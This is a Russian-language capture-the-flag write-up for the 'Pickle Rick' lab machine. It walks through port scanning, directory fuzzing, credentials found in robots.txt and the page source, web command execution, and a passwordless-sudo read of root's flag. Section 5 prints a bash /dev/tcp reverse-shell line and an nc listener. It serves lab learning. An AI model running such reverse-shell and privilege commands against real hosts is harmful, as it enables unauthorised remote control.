# Writeup по машине [Pickle Rick]

## 1. Рекогносцировка

Сканируем порты и определяем сервисы:
```bash
nmap -sC -sV 10.10.226.50
```
Выявлено: []

## 2. Фаззинг директорий

Пробуем gobuster, но результата нет:
```bash
gobuster dir -u http://10.10.226.50/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Запускаем dirsearch c расширениями:
```bash
dirsearch -u http://10.10.226.50/ -e php,html,sql,py
```
Находим:
- `/logit.php`
- `/robots.txt` (содержит строку: `Wubbalubbadubdub`)
- `/index.html` (Username: `R1ckRul3s`)

## 3. Взлом логина

Пробуем авторизоваться через `/logit.php` с найденными данными.

## 4. Выполнение команд

Внутри поля ввода команд выполняем `ls -la` — находим файл `Sup3rS3cretPickl3Ingred.txt`.

Команда `cat` не сработала, но помогла команда `less`:

```bash
less Sup3rS3cretPickl3Ingred.txt
```
**Первый флаг получен!**

## 5. Получение реверс-шелла

Создаём обратное подключение (reverse shell), используя [revshells.com](https://www.revshells.com).

На атакующей машине:
```bash
rlwrap nc -nlvp 9999
```

На целевой:
```bash
bash -i >& /dev/tcp/10.10.x.x/9999 0>&1
```

**В качестве альтернативы**: можно было просто перейти по ссылке  
`http://10.10.53.48/Sup3rS3cretPickl3Ingred.txt`

## 6. Поиск второго флага

Выполняем:
```bash
ls
cd /home/rick/
cat 'second ingredients'
```
**Второй флаг найден!**

## 7. Привилегии и третий флаг

Проверяем sudo:
```bash
sudo -l
```
Видим, что можно запускать команды без пароля.

Получаем третий флаг:
```bash
sudo cat /root/3rd.txt
```
